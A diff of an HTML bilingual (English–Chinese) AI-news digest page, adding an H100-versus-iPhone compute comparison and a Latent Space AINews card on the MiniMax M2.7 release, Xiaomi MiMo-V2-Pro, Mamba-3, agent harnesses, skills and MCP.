-<ul style="margin:0;padding-left:20px;"><li><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Wispr Flow</strong></li></ul>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-• <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Wispr Flow</strong>（语音转文字工具）
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Of course, in practice you couldn't achieve anything like an H100 performance by wiring a bunch of iPhones together; the H100 is designed to be connected to thousands of other H100s, and has massive <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">interconnect</strong> and <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">memory bandwidth</strong> to make that possible, which the iPhone doesn't. But this gives us a rough idea of the computational capacities involved.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">当然，在实际操作中，你无法通过将一堆iPhone连接在一起来达到H100的性能；H100设计用于连接数千个其他H100，并拥有巨大的<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">interconnect</strong>（互连）和<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">memory bandwidth</strong>（内存带宽）来实现这一点，而iPhone不具备这些特性。但这让我们对涉及的计算能力有了大致的概念。</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-Read the post
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-阅读全文
-</p>
-
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-Read more
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-阅读更多
-</p></div>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Another comparison: An H100 has about 80 billion <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">transistors</strong>, whereas an A18 has about 20 billion.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">另一个对比：H100拥有约800亿个<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">transistors</strong>（晶体管），而A18约有200亿个。</p></div>
       <button class="toggle-btn" onclick="toggleTranslation(this)">展开全文翻译</button>
-      <a class="link" href="https://www.lennysnewsletter.com/p/how-i-built-lennyrpg-f85" target="_blank">阅读原文 &rarr;</a>
+      <a class="link" href="https://www.construction-physics.com/p/how-much-computing-power-is-in-a" target="_blank">阅读原文 &rarr;</a>
+    </div>
+
+<div class="article-card">
+      <div class="source">Latent Space</div>
+      <div class="title-row">
+        <div class="title">MiniMax 2.7：成本仅为GLM-5三分之一的SOTA开源模型</div>
+        <span class="tone-pill" style="background:#dbeafe;color:#1d4ed8">📊 分析</span>
+      </div>
+      <div class="title-en">[AINews] MiniMax 2.7: GLM-5 at 1/3 cost SOTA Open Model</div>
+      <div class="tags"><span class="tag">MiniMax</span><span class="tag">开源模型</span><span class="tag">自我进化</span></div>
+      <div class="summary">MiniMax 发布新一代开源模型 MiniMax 2.7，以 GLM-5 三分之一的成本实现同等性能，并首次引入模型自主参与训练迭代的&quot;自我进化&quot;机制。</div>
+      <div class="quotes-section">
+<div class="quote-block"><div class="quote-en">The strongest recurring theme is that harness engineering is becoming the real differentiator: Multiple posts argued that the bottleneck is no longer just the base model, but the surrounding execution environment.</div><div class="quote-zh">一个最强烈的反复出现的主题是，harness工程正成为真正的差异化因素：多篇帖子指出，瓶颈不再仅仅是基础模型，而是周围的执行环境。</div></div>
+<div class="quote-block"><div class="quote-en">The team calls out &#x27;Early Echoes of Self-Evolution&#x27;, calling it &#x27;our first model deeply participating in its own evolution.&#x27;</div><div class="quote-zh">团队提出了&#x27;自进化的早期回响&#x27;这一概念，称其为&#x27;首个深度参与自身演化的模型&#x27;。</div></div>
+</div>
+      <div class="translation"><h3 style="margin:24px 0 12px;">[AINews] MiniMax 2.7: GLM-5 at 1/3 cost SOTA Open Model</h3>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Not 2 months after <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">MiniMax</strong>'s <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">IPO</strong> and first public quarter, MiniMax is back in the news with <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MiniMax 2.7</strong>, a nice bright spot in Chinese Open Models after the changeover in <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Qwen</strong>. They match Z.ai's <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">GLM-5</strong> SOTA open model from last month, but the story is efficiency here (see green quadrant in Artificial Analysis' chart):</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">在 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">MiniMax</strong> <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">IPO</strong> 及首个公开季度发布不到两个月后，MiniMax 凭借 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MiniMax 2.7</strong> 再次成为新闻焦点。在 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Qwen</strong> 架构更替之后，这成为中国开源模型领域的一大亮点。该模型追平了上月 Z.ai 的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">GLM-5</strong> SOTA（State-of-the-Art，最先进）开源模型，但核心故事在于效率（参见 Artificial Analysis 图表中的绿色象限）：</p>
+
+<img src="https://substackcdn.com/image/fetch/$s_!bZgR!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f6a39ab-2a8a-499d-898d-437396bd2f4b_3600x2114.png" alt="Artificial Analysis chart" style="max-width:100%;border-radius:8px;margin:12px 0;"/>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">The team calls out "<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Early Echoes of Self-Evolution</strong>", calling it "our first model deeply participating in its own evolution.", recalling <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Karpathy</strong>'s <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Autoresearch</strong>, although they only claim that "M2.7 is capable of handling 30%-50% of the workflow.":</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">团队提出了"<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">自我进化的早期回响</strong>（Early Echoes of Self-Evolution）"的概念，称其为"首个深度参与自身进化的模型"，这让人联想到 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Karpathy</strong> 的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Autoresearch</strong>（自动研究），尽管他们仅声称"M2.7 能够处理 30%-50% 的工作流程"：</p>
+
+<img src="https://substackcdn.com/image/fetch/$s_!KE3r!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6f79d04e-0fdf-4940-90e0-9a7e5825f934_1280x673.jpeg" alt="Self-Evolution diagram" style="max-width:100%;border-radius:8px;margin:12px 0;"/>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">They also report some work on <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">multi-agent collaboration</strong> ("Agent Teams") as well as follow <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Anthropic</strong> and <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong>'s lead in applying their models for finance usecases. Finally, they launch <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">OpenRoom</strong>, an open source demo for entertainment usecases.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">他们还报告了在<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">多智能体协作</strong>（multi-agent collaboration，即"Agent Teams"）方面的工作，并效仿 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Anthropic</strong> 和 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> 的做法，将模型应用于金融用例。最后，他们发布了 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">OpenRoom</strong>，一个面向娱乐用例的开源演示项目。</p>
+
+<blockquote style="border-left:3px solid #c0c0c0;padding:8px 16px;margin:8px 0;background:#f9f9fb;">
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">AI News for 3/18/2026-3/19/2026. We checked 12 subreddits, 544 Twitters and no further Discords. AINews' website lets you search all past issues. As a reminder, AINews is now a section of Latent Space. You can opt in/out of email frequencies!</div>
+</blockquote>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">2026年3月18日-19日的 AI 新闻。我们查看了 12 个子版块、544 个 Twitter 账号，没有更多 Discord 信息。AINews 网站允许你搜索所有过往期刊。提醒一下，AINews 现在是 Latent Space 的一个栏目。你可以选择加入或退出邮件频率！</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">AI News for 3/18/2026-3/19/2026. We checked 12 subreddits, 544 Twitters and no further Discords. AINews' website lets you search all past issues. As a reminder, AINews is now a section of Latent Space. You can opt in/out of email frequencies!</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">2026年3月18日-19日的 AI 新闻。我们查看了 12 个子版块、544 个 Twitter 账号，没有更多 Discord 信息。AINews 网站允许你搜索所有过往期刊。提醒一下，AINews 现在是 Latent Space 的一个栏目。你可以选择加入或退出邮件频率！</p>
+
+<h3 style="margin:24px 0 12px;">AI Twitter Recap</h3>
+
+<h4 style="margin:24px 0 12px;">MiniMax M2.7, Xiaomi MiMo-V2-Pro, and the expanding "self-evolving agent" model class</h4>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MiniMax M2.7</strong> is the headline model release: MiniMax positioned M2.7 as its first model that "deeply participated in its own evolution," claiming <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">56.22% on SWE-Pro</strong>, <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">57.0% on Terminal Bench 2</strong>, <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">97% skill adherence</strong> across 40+ skills, and parity with <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Sonnet 4.6</strong> in OpenClaw. A follow-up says the internal harness also recursively improved itself—collecting feedback, building eval sets, and iterating on <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">skills/MCP</strong>, memory, and architecture (thread). Third-party coverage broadly echoed the "self-evolving" framing, including TestingCatalog and kimmonismus.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MiniMax M2.7</strong> 是本次的头条模型发布：MiniMax 将 M2.7 定位为其首个"深度参与自身进化"的模型，声称在 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">SWE-Pro</strong> 上达到 56.22%，在 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Terminal Bench 2</strong> 上达到 57.0%，在 40 多项技能上达到 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">97% 的技能遵循率</strong>（skill adherence），并在 OpenClaw 中与 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Sonnet 4.6</strong> 持平。后续消息称其内部 harness（ harness engineering，工具链工程）也实现了递归自我改进——收集反馈、构建评估集，并迭代优化 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">skills/MCP</strong>（Model Context Protocol，模型上下文协议）、内存和架构。第三方报道广泛呼应了"自我进化"的框架，包括 TestingCatalog 和 kimmonismus。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Artificial Analysis</strong> places M2.7 on the cost/performance frontier: Artificial Analysis reports <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">50</strong> on its Intelligence Index, matching <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">GLM-5 (Reasoning)</strong> while costing <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">$176</strong> to run the full index at <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">$0.30/$1.20 per 1M</strong> input/output tokens—less than one-third of GLM-5's cost. They also report <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">GDPval-AA Elo 1494</strong>, ahead of MiMo-V2-Pro (1426), GLM-5 (1406), and Kimi K2.5 (1283), plus a large hallucination reduction vs M2.5. Distribution was immediate: Ollama cloud, Trae, Yupp, OpenRouter, Vercel, Zo, opencode, and kilocode.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Artificial Analysis</strong> 将 M2.7 置于成本/性能前沿：该机构报告其智能指数（Intelligence Index）为 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">50</strong>，与 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">GLM-5 (Reasoning)</strong> 持平，而运行完整指数的成本仅为 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">176 美元</strong>，定价为每百万输入/输出 token <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">0.30/1.20 美元</strong>——不到 GLM-5 成本的三分之一。他们还报告 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">GDPval-AA Elo 1494</strong>，超越 MiMo-V2-Pro (1426)、GLM-5 (1406) 和 Kimi K2.5 (1283)，同时相比 M2.5 大幅减少了幻觉（hallucination）。分发渠道立即上线：Ollama cloud、Trae、Yupp、OpenRouter、Vercel、Zo、opencode 和 kilocode。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Xiaomi</strong>'s <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MiMo-V2-Pro</strong> looks like a serious Chinese API-only reasoning entrant: Artificial Analysis scores it at <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">49</strong> on the Intelligence Index, with <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">1M context</strong>, <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">$1/$3 per 1M tokens</strong> pricing, and GDPval-AA Elo 1426. Notably, they call out stronger token efficiency than peers and a relatively favorable <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">AA-Omniscience score (+5)</strong> driven by lower hallucination. This follows Xiaomi's earlier open-weight MiMo-V2-Flash (309B total / 15B active, MIT); V2-Pro itself is API-only for now.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">小米（Xiaomi）</strong>的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MiMo-V2-Pro</strong> 看起来是一个严肃的中国 API-only（仅 API）推理模型竞争者：Artificial Analysis 给予其智能指数 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">49</strong> 的评分，支持 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">100 万 token 上下文</strong>，定价为每百万 token <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">1/3 美元</strong>，GDPval-AA Elo 为 1426。值得注意的是，他们指出该模型比同行具有更强的 token 效率，以及因幻觉更低而获得的较好 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">AA-Omniscience 分数（+5）</strong>。这紧随小米此前开源权重的 MiMo-V2-Flash（总计 309B / 激活 15B，MIT 许可证）；V2-Pro 目前仅为 API 版本。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Mamba-3</strong> is out and immediately being viewed through the hybrid-architecture lens: <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Cartesia</strong> announced Mamba-3 as an <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">SSM</strong> (State Space Model) optimized for an inference-heavy world, with <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Albert Gu</strong> noting Cartesia-backed testing and support (link). Early technical reactions focused less on standalone SSMs and more on plugging Mamba-3 into transformer hybrids: rasbt explicitly called out replacing Gated DeltaNet in next-gen hybrids like Qwen3.5 / Kimi Linear, while JG_Barthelemy highlighted hybrid integration and "unlocking Muon for SSMs."</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Mamba-3</strong> 已发布，并立即通过混合架构（hybrid-architecture）的视角被审视：<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Cartesia</strong> 宣布 Mamba-3 是一个为推理密集型世界优化的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">SSM</strong>（State Space Model，状态空间模型），<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Albert Gu</strong> 提到了 Cartesia 支持的测试和支援。早期技术反应较少关注独立 SSM，更多关注将 Mamba-3 插入 Transformer 混合架构：rasbt 明确呼吁在下一代混合架构（如 Qwen3.5 / Kimi Linear）中替代 Gated DeltaNet，而 JG_Barthelemy 则强调了混合集成和"为 SSM 解锁 Muon（优化器）"。</p>
+
+<h4 style="margin:24px 0 12px;">Agent harnesses, skills, MCP, and the shift from "prompting" to systems design</h4>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">The strongest recurring theme is that <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">harness engineering</strong> is becoming the real differentiator: Multiple posts argued that the bottleneck is no longer just the base model, but the surrounding execution environment. <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">The Turing Post</strong>'s interview with <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Michael Bolin</strong> frames coding agents as a problem of tools, repo legibility, constraints, and feedback loops—what many now call harness engineering. dbreunig made a similar point about why teams stick with <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">DSPy</strong>, and nickbaumann_argued <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">GPT-5.4 mini</strong> matters specifically because cheap, fast subagents change what is worth delegating.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">最强烈的重复主题是<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">工具链工程</strong>（harness engineering）正成为真正的差异化因素：多篇帖子指出，瓶颈不再仅仅是基础模型，而是周围的执行环境。<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">The Turing Post</strong> 对 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Michael Bolin</strong> 的采访将编程智能体（coding agents）框定为工具、代码库可读性、约束和反馈循环的问题——这正是许多人现在所称的 harness engineering。dbreunig 就团队为何坚持使用 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">DSPy</strong>（一个编程框架）提出了类似观点，而 nickbaumann_ 则认为 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">GPT-5.4 mini</strong> 之所以重要，特别是因为廉价、快速的子智能体（subagents）改变了值得委托（delegating）的内容。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Skills</strong> are solidifying into a shared abstraction across agent stacks: A practical thread from mstockton lays out real usage patterns for SKILLS: progressive disclosure, trace inspection, session distillation, CI-triggered skills, and self-improving skills. <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">RhysSullivan</strong> suggests distributing skills via <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MCP</strong> resources may solve staleness/versioning. Anthropic's <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Claude Code</strong> account clarifies that a skill is not just a text snippet but a folder with scripts/assets/data, and that the key description field should specify when to trigger it (tweet).</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">技能（Skills）</strong>正在固化为一项跨智能体技术栈的共享抽象：mstockton 的一个实用线程列出了 SKILLS 的真实使用模式：渐进式披露（progressive disclosure）、追踪检查（trace inspection）、会话蒸馏（session distillation）、CI 触发的技能，以及自我改进的技能。<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">RhysSullivan</strong> 建议通过 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MCP</strong>（Model Context Protocol）资源分发技能，可能解决陈旧性/版本控制问题。Anthropic 的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Claude Code</strong> 账户澄清说，技能不仅仅是文本片段，而是一个包含脚本/资产/数据的文件夹，且关键描述字段应指定何时触发它。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Open agent stacks are converging on model + runtime + harness: <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Harrison Chase</strong> published a walkthrough framing Claude Code, OpenClaw, Manus, etc. as the same decomposition: open model + runtime + harness, using <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Nemotron 3</strong>, NVIDIA's <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">OpenShell</strong>, and DeepAgents. Related infrastructure releases include <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">LangSmith Sandboxes</strong> for secure code execution, <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">LangSmith Polly GA</strong> as an in-product debugging/improvement assistant, and a new LangChain guide on production observability for agents.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">开放智能体技术栈正收敛于模型 + 运行时 + 工具链（model + runtime + harness）：<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Harrison Chase</strong> 发布了一份演练，将 Claude Code、OpenClaw、Manus 等框定为相同的分解结构：开放模型 + 运行时 + 工具链，使用 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Nemotron 3</strong>、NVIDIA 的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">OpenShell</strong> 和 DeepAgents。相关基础设施发布包括用于安全代码执行的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">LangSmith Sandboxes</strong>、作为产品内调试/改进助手的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">LangSmith Polly GA</strong>，以及一份关于智能体生产可观测性的新 LangChain 指南。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MCP</strong> momentum continues, but there's pushback: Useful MCP-related launches included Google Colab's open-source <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MCP server</strong>, enabling local agents to drive Colab GPU runtimes, and Google's Gemini API update allowing built-in tools plus custom functions in one call. At the same time, there's visible skepticism: skirano bluntly said "MCP was a mistake. Long live CLIs." and denisyarats joked about "model cli protocol."</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MCP</strong>（Model Context Protocol）的势头持续，但也遭遇反对：有用的 MCP 相关发布包括 Google Colab 的开源 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">MCP 服务器</strong>，使本地智能体能够驱动 Colab GPU 运行时，以及 Google Gemini API 更新，允许在一个调用中结合内置工具和自定义函数。与此同时，也出现了明显的质疑：skirano 直言"MCP 是个错误。CLI 万岁。"而 denisyarats 则开玩笑提到了"模型 CLI 协议"。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">A parallel trend: agent-native enterprise apps and "<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">headless SaaS</strong>": ivanburazin describes an emerging category of headless SaaS—traditional software rebuilt as agent-first APIs with no human UI. That idea lines up with product launches like <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Rippling</strong>'s AI analyst, Anthropic's <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Claude</strong> for Excel/PowerPoint webinar, and the notion that meeting-notes apps are really becoming broader AI context/data apps (zachtratar).</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">一个并行趋势：原生智能体企业应用和"<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">无头 SaaS</strong>"（headless SaaS）：ivanburazin 描述了一个新兴的无头 SaaS 类别——将传统软件重建为智能体优先（agent-first）的 API，没有人类用户界面。这一想法与 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Rippling</strong> 的 AI 分析师、Anthropic 的 Excel/PowerPoint 版 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Claude</strong> 网络研讨会等产品发布相吻合，也符合会议记录应用正真正变成更广泛的 AI 上下文/数据应用（zachtratar）的概念。</p>
+
+<h4 style="margin:24px 0 12px;">Infra, kernels, and model-system co-design</h4>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Attention Residual</strong> became a case study in infra-model co-design: Several posts unpacked <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Kimi</strong>/<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Moonshot</strong>'s AttnRes work as more than a novelty architecture. bigeagle_xd emphasized co-design across model research and infra, linking to an inference-infra writeup; ZhihuFrontiers summarized why full attention residual strains <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">pipeline parallelism</strong> due to asymmetric comms/memory patterns, and how Block Attention Residual plus cross-stage caching can restore symmetry. YyWangCS17122 reinforced the theme: kernel optimization, algorithm-system co-design, and numerical rigor as the path to production-worthy large models.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Attention Residual</strong>（注意力残差）成为基础设施-模型协同设计（infra-model co-design）的案例研究：多篇帖子解析了 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Kimi</strong>/<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Moonshot</strong>（月之暗面）的 AttnRes 工作，认为其不仅仅是新奇的架构。bigeagle_xd 强调了模型研究与基础设施之间的协同设计，并链接到一篇推理基础设施的文章；ZhihuFrontiers 总结了为什么完整的注意力残差会因不对称的通信/内存模式而给<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">流水线并行</strong>（pipeline parallelism）带来压力，以及块注意力残差（Block Attention Residual）加跨阶段缓存如何恢复对称性。YyWangCS17122 强化了这一主题：内核优化、算法-系统协同设计和数值严谨性是通往值得生产部署的大型模型的路径。</p>
+
